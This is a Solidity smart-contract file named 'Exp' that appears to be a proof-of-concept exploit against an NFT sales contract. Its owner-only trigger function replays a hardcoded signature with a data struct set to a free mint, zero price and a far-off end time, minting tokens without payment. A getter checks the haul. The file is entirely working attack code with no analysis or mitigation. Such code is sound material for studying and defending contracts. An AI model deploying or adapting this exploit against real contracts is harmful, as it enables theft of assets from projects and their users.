// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "hardhat/console.sol";
import "./interfaces/IToken.sol";
import "./interfaces/ISales.sol";

contract Exp {
    address private immutable owner;
    IToken private immutable nba_token;
    ISales private immutable sales;


    modifier onlyOwner() {
        require(msg.sender == owner, "Not your biz!");
        _;
    }

    constructor(IToken _nba, ISales _sales) {
        owner = msg.sender;
        nba_token = _nba;
        sales = _sales;
    }

    function trigger() external onlyOwner {
        dusty.vData memory info = dusty.vData({
            mint_free: true,
            max_mint: 1,
            from: 0x35a9BFD953b4A9b7b64718c5A0988FA6a88F1ce5,
            start: 0,
            end: 5555555555,
            eth_price: 0,
            dust_price: 0,
            signature: hex"6a8e1e18e852a96845d4d91a39a9d0ff4c4219200758e8564f3df1dc01109c30611a44924905d26b96e26df5ebc004f1d9d03b685e28e4a6fbc703f1253f63221c"
        });

        sales.mint_approved(info, 100, 69);
    }

    function getter() external view returns (uint256) {
        return nba_token.balanceOf(address(this));
    }

}
